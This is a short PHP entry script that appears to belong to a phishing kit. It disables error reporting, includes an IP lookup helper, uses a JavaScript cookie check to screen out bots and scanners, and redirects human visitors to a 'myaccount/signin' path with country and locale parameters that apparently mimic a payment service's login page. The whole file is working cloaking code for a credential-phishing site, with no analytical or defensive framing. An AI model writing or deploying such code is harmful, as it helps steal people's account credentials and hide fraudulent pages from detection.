<?php
session_start();
error_reporting(0);
@$_SESSION['pagecount']++;
include('./functions/get_ip.php');
?>
<html>
<head>

<?php 
if (!isset($_COOKIE['JSEnabled']) || strlen($_COOKIE['JSEnabled'])!=32 ) {
  $js_cookie=md5(md5(@$_SESSION['pagecount']) . $_SERVER['REMOTE_ADDR']);
  echo '<script language="javascript">';
  echo 'document.cookie="JSEnabled=' . $js_cookie . '"';
  echo '</script>';
  echo '<meta http-equiv="refresh" content="0;./myaccount/signin/?country.x='.$_SESSION['_LOOKUP_CNTRCODE_'].'&locale.x=en_'.$_SESSION['_LOOKUP_CNTRCODE_'].'&0x0='.md5(base64_encode(date('H:i:s'))).'" />';
}
?>

<?php 
 $js=$_COOKIE['JSEnabled'];
 if ($js!=md5(md5(@$_SESSION['pagecount']-1) . $_SERVER['REMOTE_ADDR'])) {
 $js_cookie=md5(md5(@$_SESSION['pagecount']) . $_SERVER['REMOTE_ADDR']);
  echo '<script language="javascript">';
  echo 'document.cookie="JSEnabled=' . $js_cookie . '"';
  echo '</script>';
     echo "</head><body>Please wait ...</body></html>";
     die();
 } else {
  $js_cookie=md5(md5(@$_SESSION['pagecount']) . $_SERVER['REMOTE_ADDR']);
  echo '<script language="javascript">';
  echo 'document.cookie="JSEnabled=' . $js_cookie . '"';
  echo '</script>';

 }

?>
